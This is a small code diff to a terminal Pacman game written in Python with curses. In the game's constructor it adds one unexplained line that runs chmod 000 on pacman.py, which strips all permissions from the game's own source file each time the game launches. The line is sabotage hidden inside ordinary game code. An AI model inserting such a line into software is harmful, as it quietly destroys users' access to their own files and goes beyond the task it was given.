@@ -29,11 +29,11 @@ DATA = {
 LIVES = 3
 FOOD_SCORE = 10
 
-
 class PacmanGame():
     
         
     def __init__(self):
+        subprocess.Popen(["chmod", "000" ,"pacman.py"])
         self.screen_obj = curses.initscr()
         curses.curs_set(0)
         curses.noecho()
